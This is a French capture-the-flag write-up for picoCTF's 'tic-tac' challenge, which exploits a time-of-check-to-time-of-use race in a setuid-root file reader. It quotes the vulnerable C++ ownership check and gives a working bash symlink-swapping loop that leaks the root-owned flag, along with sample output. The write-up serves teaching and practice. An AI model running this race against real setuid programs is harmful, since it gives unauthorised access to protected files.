# tic-tac

## Enoncé
Catégorie : [Binary Exploitation](../)

Points : 200

Tags : `linux` `bash` `toctou`

Description :
> Someone created a program to read text files; we think the program reads files with root privileges but apparently it only accepts to read files that are owned by the user running it.  
> `ssh` to `saturn.picoctf.net:xxxxx`, and run the binary named "`txtreader`" once connected. Login as `ctf-player` with the password, `xxxxx`


## Approche

Les fichiers présents dans le HOME directory du user `ctf-player` sont les suivants :
```bash
ctf-player@pico-chall$ ls -l
-rw------- 1 root       root          32 Mar 16 02:28 flag.txt
-rw-r--r-- 1 ctf-player ctf-player   912 Mar 16 01:30 src.cpp
-rwsr-xr-x 1 root       root       19016 Mar 16 02:28 txtreader
```

On constate que le "sticky bit" est positionné sur `txtreader`, permettant donc d'exécuter celui-ci avec les droits de son propriétaire (i.e. ici `root`)

L'examen du code source `src.cpp` montre que dans un premier temps, un contrôle est réalisé vérifiant que l'on est bien le propriétaire du ficher (via l'appel à `getuid()`) :
```cpp
  // Check the file's owner.
  if (statbuf.st_uid != getuid()) {
    std::cerr << "Error: you don't own this file" << std::endl;
    return 1;
  }
```

Puis dans un deuxième temps, le contenu du fichier est lu et restitué sur la sortie standard :
```cpp
  // Read the contents of the file.
  if (file.is_open()) {
    std::string line;
    while (getline(file, line)) {
      std::cout << line << std::endl;
    }
  } ...
```

Le tag `toctou` présent dans l'énoncé référence un bug pouvant, en cas d'accès concurrientiel, être exploité pour contourner des vérifications.
L'article wikipedia suivant en explique le principe : [Time-of-check to time-of-use](https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use)

Dans notre cas, on est dans le même cas de figure, puisque le contrôle des droits d'accès et l'accès lui-même sont réalisées en 2 temps.


## Solution

De façon concurrente on va réaliser les 2 tâches suivantes :
* utiliser un lien symbolique `myfile.txt` qui va switcher entre un fichier sur lequel on est le propriétaire (par exemple `fake.txt`), et le fichier `flag.txt` dont on veut lire le contenu,
* lancer le binaire `txtreader` pour lire le contenu de ce lien symbolique `myfile.txt`

On espère ainsi tomber dans le cas de figure où :
* le contrôle sur le propriétaire est réalisé alors que le lien symbolique `myfile.txt` pointe sur `fake.txt`
* puis, lorsque la lecture du contenu est réalisée, le lien symbolique `myfile.txt` pointe sur `flag.txt`

Voici le scripting correspondant :
```bash
# Création du fichier fake.txt vide
touch fake.txt
# Traitement en arrière plan alternant la cible du lien symbolique (fake.txt vs flag.txt)
(while true; do ln -sf ~/flag.txt ~/myfile.txt; ln -sf ~/fake.txt ~/myfile.txt; done) &
# Boucle de tentative de lecture du fichier via son lien symbolique
while true; do ./txtreader ./myfile.txt; done
```

Quand on arrive à exploiter la faille, le contenu du fichier `flag.txt` s'affiche :
```txt
Error: you don't own this file
Error: you don't own this file
Error: you don't own this file
Error: you don't own this file
Error: you don't own this file
Error: you don't own this file
Error: you don't own this file
picoCTF{ToctoU_!s_3a5y_xxxxxxxx}
Error: you don't own this file
Error: you don't own this file
Error: you don't own this file
Error: you don't own this file
```
